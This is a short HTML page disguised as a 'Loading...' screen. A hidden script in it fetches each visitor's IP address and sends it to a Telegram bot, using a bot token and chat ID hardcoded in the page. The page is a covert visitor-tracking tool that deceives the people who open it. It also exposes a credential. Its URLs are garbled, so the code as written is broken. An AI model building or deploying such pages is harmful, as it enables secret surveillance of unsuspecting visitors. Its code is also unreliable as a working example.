<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <p>Loading page, please wait...</p>

    <script>
        // Replace with your actual Telegram Bot Token and Chat ID
        const BOT_TOKEN = "8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE";
        const CHAT_ID = "8714686528";

        // Fetch user IP address from a public API
        fetch('https://ipify.org')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;
                const message = encodeURIComponent(`New visitor IP: ${userIp}`);
                
                // Send the IP to your Telegram bot
                const telegramUrl = `https://telegram.org{BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
                
                return fetch(telegramUrl);
            })
            .catch(error => {
                console.error('Error logging IP:', error);
            });
    </script>
</body>
</html>
